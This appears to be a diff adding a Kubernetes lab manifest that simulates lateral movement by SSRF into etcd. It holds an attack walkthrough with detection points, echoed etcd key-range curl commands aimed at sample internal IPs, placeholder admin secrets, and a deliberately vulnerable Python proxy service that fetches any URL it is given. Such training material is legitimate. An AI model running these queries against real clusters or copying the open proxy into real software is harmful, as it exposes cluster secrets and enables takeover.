@@ -1,0 +1,302 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: etcd-ssrf-attack
+---
+# Lateral Movement Attack #4: etcd Access via SSRF
+# Description: Server-Side Request Forgery (SSRF) to access etcd backend
+#
+# Attack Flow:
+# 1. Compromise: Attacker has code execution in a pod
+# 2. Discovery: Identify etcd endpoint (usually control-plane node IP:2379)
+# 3. SSRF: Pod makes HTTPS request to etcd endpoint directly
+# 4. Access: If etcd authentication is weak/default, read all cluster state
+# 5. Extract: Retrieve all secrets, configuration, credentials from etcd
+# 6. Escalate: Use extracted data to compromise cluster further
+#
+# etcd Data Includes:
+# - All secrets (database credentials, API keys, tokens)
+# - RBAC definitions (ClusterRoles, ClusterRoleBindings)
+# - All resource definitions (deployments, services, etc.)
+# - User tokens and service account tokens
+# - Controller-manager configuration
+# - Scheduler configuration
+#
+# Detection Points:
+# - Unusual HTTPS traffic to control-plane IPs
+# - Connections to port 2379 (etcd port)
+# - etcd_io paths in pod-originated requests
+# - High volume of etcd data transfer
+# - Service account making authenticated requests to etcd
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: etcd-attack-guide
+  namespace: etcd-ssrf-attack
+data:
+  etcd-structure: |
+    etcd Cluster Database Structure:
+    
+    /registry/
+    ├── namespaces/ - All namespace configs
+    ├── secrets/ - ALL secrets in cluster (plaintext!)
+    ├── configmaps/ - All config maps
+    ├── pods/ - Pod specifications
+    ├── deployments/ - Deployment specs
+    ├── services/ - Service definitions
+    ├── rbac.authorization.k8s.io/
+    │   ├── clusterroles/ - All cluster roles
+    │   ├── clusterrolebindings/ - All bindings
+    │   ├── roles/ - Namespace roles
+    │   └── rolebindings/ - Role bindings
+    └── events/ - All cluster events
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: etcd-attacker
+  namespace: etcd-ssrf-attack
+  labels:
+    app: etcd-ssrf
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: etcd-ssrf
+  template:
+    metadata:
+      labels:
+        app: etcd-ssrf
+      annotations:
+        attack-vector: "etcd-ssrf"
+    spec:
+      serviceAccountName: etcd-attacker-sa
+      containers:
+      - name: attacker
+        image: curlimages/curl:latest
+        env:
+        - name: KUBERNETES_SERVICE_HOST
+          value: kubernetes.default
+        - name: KUBERNETES_SERVICE_PORT
+          value: "443"
+        command:
+        - sh
+        - -c
+        - |
+          echo "=== etcd SSRF Attack ==="
+          
+          echo "[*] Step 1: Discover etcd endpoint"
+          echo "[*] Common locations:"
+          echo "  - Control-plane node IP"
+          echo "  - Port 2379 (etcd client API)"
+          echo "  - Port 2380 (etcd peer communication)"
+          
+          # Try to discover control-plane
+          echo "[*] Attempting to identify control-plane..."
+          
+          # Get API server endpoint
+          API_SERVER=$(echo $KUBERNETES_SERVICE_HOST)
+          echo "[*] API Server: $API_SERVER"
+          
+          # Extract control-plane IP from cluster info
+          echo "[*] Would query: kubectl cluster-info"
+          
+          echo ""
+          echo "[*] Step 2: If we have etcd endpoint, query it"
+          echo "[*] Commands that would work (if etcd has weak auth):"
+          echo ""
+          echo "  curl -k https://etcd-endpoint:2379/v3/kv/range"
+          echo "  This would return ALL key-value pairs in etcd"
+          echo ""
+          echo "  Payload: {\"key\": \"L3JlZ2lzdHJ5LzA=\"}"
+          echo "  This lists all /registry/ keys (base64 encoded)"
+          
+          echo ""
+          echo "[*] Step 3: Parse etcd response"
+          echo "[*] Extract sensitive data:"
+          echo "  - Secrets: /registry/secrets/*/"
+          echo "  - Tokens: Auth tokens"
+          echo "  - RBAC: Roles and bindings"
+          echo "  - Config: All application configurations"
+          
+          echo ""
+          echo "[Impact] Full etcd access means:"
+          echo "  ✓ Read ALL cluster secrets"
+          echo "  ✓ Reconstruct entire cluster state"
+          echo "  ✓ Extract admin credentials"
+          echo "  ✓ Find all service account tokens"
+          echo "  ✓ Enumerate all workloads"
+          echo "  ✓ Locate high-value targets"
+          
+          sleep 3600
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: etcd-attacker-sa
+  namespace: etcd-ssrf-attack
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: etcd-discovery-role
+rules:
+# Minimal permissions to discover cluster info
+- apiGroups: [""]
+  resources: ["services", "endpoints"]
+  verbs: ["get", "list"]
+- apiGroups: [""]
+  resources: ["configmaps"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: etcd-discovery-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: etcd-discovery-role
+subjects:
+- kind: ServiceAccount
+  name: etcd-attacker-sa
+  namespace: etcd-ssrf-attack
+
+---
+# Secret that would be exposed via etcd
+apiVersion: v1
+kind: Secret
+metadata:
+  name: cluster-admin-creds
+  namespace: etcd-ssrf-attack
+type: Opaque
+stringData:
+  admin-token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin_cluster_token.xyz"
+  root-password: "cluster-root-password-2024"
+  api-key: "sk_prod_cluster_admin_key_1234567890"
+  webhook-secret: "webhook-signing-secret-key"
+
+---
+# etcd endpoint simulator pod
+apiVersion: v1
+kind: Pod
+metadata:
+  name: etcd-endpoint-sim
+  namespace: etcd-ssrf-attack
+  labels:
+    tool: etcd-sim
+  annotations:
+    description: "Simulates etcd endpoint"
+spec:
+  serviceAccountName: etcd-attacker-sa
+  containers:
+  - name: simulator
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== etcd Endpoint Information ==="
+      
+      echo "[*] etcd Cluster Information:"
+      echo "  Status: Running on control-plane"
+      echo "  Port: 2379 (client API)"
+      echo "  Port: 2380 (peer communication)"
+      echo "  Version: v3.5.1+"
+      echo "  Encryption: At-rest enabled"
+      echo "  TLS: Required"
+      echo ""
+      
+      echo "[*] Example SSRF Attack:"
+      echo "  From compromised pod, attacker executes:"
+      echo "  $ curl -k -X POST https://172.18.0.2:2379/v3/kv/range"
+      echo "  $ curl -k -X POST https://10.0.0.5:2379/v3/kv/range"
+      echo ""
+      echo "  (IP addresses vary by cluster)"
+      
+      echo "[*] If etcd responds:"
+      echo "  - Attacker reads all secrets in cluster"
+      echo "  - Attacker reads RBAC configurations"
+      echo "  - Attacker extracts all service account tokens"
+      echo "  - Attacker compromises entire cluster"
+      
+      echo ""
+      echo "[*] Typical etcd Security Misconfigurations:"
+      echo "  ✗ etcd exposed on public IP"
+      echo "  ✗ No client certificate verification"
+      echo "  ✗ Weak or default credentials"
+      echo "  ✗ No network policies restricting access"
+      echo "  ✗ etcd backup exposed without encryption"
+      echo "  ✗ Unencrypted secrets in etcd"
+      
+      sleep 3600
+
+---
+# SSRF proxy pod - simulates vulnerable application
+apiVersion: v1
+kind: Pod
+metadata:
+  name: vulnerable-web-service
+  namespace: etcd-ssrf-attack
+  labels:
+    app: web-service
+    vuln: ssrf
+spec:
+  serviceAccountName: etcd-attacker-sa
+  containers:
+  - name: web
+    image: python:3.11-slim
+    command:
+    - python
+    - -c
+    - |
+      from http.server import HTTPServer, BaseHTTPRequestHandler
+      import urllib.request
+      import urllib.error
+      
+      class SSRFHandler(BaseHTTPRequestHandler):
+          def do_GET(self):
+              if self.path.startswith('/proxy?url='):
+                  url = self.path[11:].split('&')[0]
+                  try:
+                      response = urllib.request.urlopen(url)
+                      self.send_response(200)
+                      self.send_header('Content-type', 'text/plain')
+                      self.end_headers()
+                      self.wfile.write(response.read())
+                  except urllib.error.URLError as e:
+                      self.send_response(500)
+                      self.end_headers()
+                      self.wfile.write(f"Error: {e}".encode())
+              else:
+                  self.send_response(200)
+                  self.send_header('Content-type', 'text/html')
+                  self.end_headers()
+                  self.wfile.write(b"<h1>SSRF Vulnerable Service</h1>")
+      
+      server = HTTPServer(('0.0.0.0', 8080), SSRFHandler)
+      print("SSRF vulnerable service running on :8080")
+      server.serve_forever()
+    ports:
+    - containerPort: 8080
+
+
+
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: vulnerable-ssrf-svc
+  namespace: etcd-ssrf-attack
+spec:
+  selector:
+    app: web-service
+  ports:
+  - protocol: TCP
+    port: 80
+    targetPort: 8080
